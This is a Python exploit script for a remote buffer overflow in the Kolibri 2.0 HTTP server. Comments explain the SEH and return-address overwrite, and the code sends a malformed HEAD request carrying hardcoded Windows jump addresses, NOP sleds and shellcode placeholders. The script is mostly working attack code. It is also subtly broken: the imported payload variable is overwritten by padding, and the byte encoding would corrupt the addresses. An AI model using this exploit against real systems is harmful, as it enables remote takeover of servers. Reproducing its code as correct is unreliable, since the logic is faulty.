#!/usr/bin/env python

#     _             ____  __            __    ___
#    (_)____ _   __/ __ \/ /_____  ____/ /  _/_/ |
#   / // __ \ | / / / / / //_/ _ \/ __  /  / / / /
#  / // / / / |/ / /_/ / ,< /  __/ /_/ /  / / / /
# /_//_/ /_/|___/\____/_/|_|\___/\__,_/  / /_/_/ 
#                   Live by the byte     |_/_/ 
#
# Members:
#
# Pr0T3cT10n
# -=M.o.B.=-
# TheLeader (gsog2009 [a7] homtail [d0t] com)
# Sro
# Debug
#
# Contact: inv0ked.israel@gmail.com
#
# -----------------------------------
# Bug discovered by Pr0T3cT10n  
# Exploited by TheLeader, Debug
# -----------------------------------
# Description:
#
# Kolibri v2.0 is vulnerable to a remote buffer overflow attack.
# By sending a malformed HEAD request, we are able to overwrite both the return address and an SEH handler.
# Null bytes terminate the request though, but we are able to partially overwrite with a pointer to 
# a POP + POP + RET instruction inside kolibri.exe and gain control over the execution via SEH.
# This although gets complicated because the SEH handler offset between XP/2K3 and Vista/W7 is different
# by 2 bytes (probably due to local stack variables), thus we are able to cover only 2 operating system with the SEH overwrite exploit.
#
# In order to successfully exploit the RET overwrite, we need to either overwrite ret with jmp to the stack
# and then overwrite the stack with our shellcode, or find another way to get to our shellcode. Since null
# terminates the request string, it is impossible to pratially overwrite RET with an address from the binary
# and then overwrite with shellcode. We attempted finding another reliable way to get to our shellcode but haven't succeeded.
# The most reasonable option left is to overwrite RET with an OS specific address from a DLL that gets loaded by Kolibri.
# -----------------------------------
#
# Exploit Title: Kolibri v2.0 Buffer Overflow RET + SEH exploit (HEAD)
# Date: 24/12/2010
# Author: TheLeader
# Affected Version: Kolibri-2.0
# Tested on: Windows 7 x86 ENG/HEB , Windows Server 2003 SP2 ENG, Windows XP SP3 ENG
# ISRAEL, NULLBYTE.ORG.IL

import socket
import sys
import socket
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):




	host = target_machine
	port = target_port





	# ret offsets = 213, 515
	ret_offset = 515

	seh_offset_xp_2k3 = 792 # WINXP / WS2K3
	seh_offset_vista_7 = 794 # VISTA / WIN7

	# badchars = [0x00, 0x0d, 0x0a, 0x20, 0x3d, 0x3f]


	ret_xp_sp3 = "\x13\x44\x87\x7C" # 0x7C874413 WINXP SP3 JMP ESP @ kernel32.dll
	ret_2k3_sp2 = "\xC3\x3B\xF7\x76" # 0x76F73BC3 WS2K3 SP2 JMP ESP @ winrnr.dll


	
	

	
	ret = ret_xp_sp3
	seh_offset = seh_offset_xp_2k3
	# elif mode == 4:
	# 	ret = ret = ret_2k3_sp2
	# 	seh_offset = seh_offset_xp_2k3

	seh = "\x67\x1a\x48" # 0x0045586B @ kolibri.exe POP + POP + RET

	nseh="\x90\x90\xeb\xf7"
	jmp_back2 = "\xE9\x12\xFF\xFF\xFF"

	buf = "\x41" * (ret_offset)
	nops = "\x90" * (seh_offset - len(buf + ret + str(buf) + jmp_back2 + nseh))

	req = ("HEAD /" + buf + ret + nops + str(buf) + jmp_back2 + nseh + seh + " HTTP/1.1\r\n"
	"Host: " + host + ":" + str(port) + "\r\n"
	"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	"Accept-Language: he,en-us;q=0.7,en;q=0.3\r\n"
	"Accept-Encoding: gzip,deflate\r\n"
	"Accept-Charset: windows-1255,utf-8;q=0.7,*;q=0.7\r\n"
	"Keep-Alive: 115\r\n"
	"Connection: keep-alive\r\n\r\n")



	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	req = bytes(req, 'utf-8')
	s.send(req)
	s.recv(1024)


	s.close()

